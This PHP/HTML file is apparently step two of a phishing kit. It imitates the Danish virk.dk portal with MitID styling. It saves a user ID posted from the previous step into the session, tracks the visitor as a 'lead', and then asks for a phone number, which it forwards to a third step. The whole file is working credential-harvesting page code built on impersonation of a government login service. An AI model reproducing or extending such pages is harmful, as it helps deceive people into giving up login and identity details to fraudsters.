<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}

// Store Bruger-ID from step1
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['bruger_id'])) {
    $_SESSION['bruger_id'] = $_POST['bruger_id'];
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $page2_title; ?></title>
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body class="mitid-page">
    <header class="mitid-nav">
        <div class="mitid-nav-container">
            <img src="assets/logo.svg" alt="Virk Logo" class="mitid-logo">
            <span class="mitid-brand">virk.dk</span>
        </div>
    </header>

    <main class="mitid-main">
        <div class="mitid-container">
            <div class="mitid-box">
                <div class="mitid-header">
                    <div class="step-indicator">
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                        <span class="step-dot"></span>
                        <span class="step-dot"></span>
                    </div>
                    <h1><?php echo $page2_title; ?></h1>
                    <p><?php echo $page2_description; ?></p>
                </div>

                <form action="step3.php" method="POST" class="mitid-form">
                    <div class="form-group">
                        <label for="<?php echo $page2_field_name; ?>"><?php echo $page2_field_label; ?></label>
                        <div class="input-with-icon">
                            <input type="tel" 
                                   id="<?php echo $page2_field_name; ?>" 
                                   name="<?php echo $page2_field_name; ?>" 
                                   placeholder="<?php echo $page2_field_placeholder; ?>"
                                   required>
                            <span class="input-icon">📱</span>
                        </div>
                    </div>

                    <button type="submit" class="mitid-button">
                        <span class="button-text">Fortsæt</span>
                        <div class="button-loader" style="display: none;">
                            <div class="spinner"></div>
                            <span>Validerer...</span>
                        </div>
                    </button>
                </form>
            </div>
        </div>
    </main>

    <script src="assets/script.js"></script>
</body>
</html>
